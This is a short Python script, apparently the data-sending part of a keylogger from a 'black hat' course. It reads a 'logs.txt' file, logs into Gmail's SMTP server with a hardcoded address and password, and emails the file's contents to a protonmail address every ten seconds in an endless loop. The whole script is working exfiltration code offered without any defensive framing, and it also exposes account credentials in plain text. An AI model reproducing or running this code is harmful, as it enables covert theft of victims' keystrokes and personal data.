import smtplib
import time
filename = 'logs.txt'
sender = "kl@hckd.com"
receiver = ['blackhatcourse2020@protonmail.com']
f = open("logs.txt", "r")
message = (f.read())
sender_address = 'spprtpplcm@gmail.com '
sender_pass = 'spprtpplcm@54321'
def executeSomething():
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    session.sendmail(sender, receiver, message)
    session.quit()
    print('Mail Sent')
    time.sleep(10)
while True:
    executeSomething()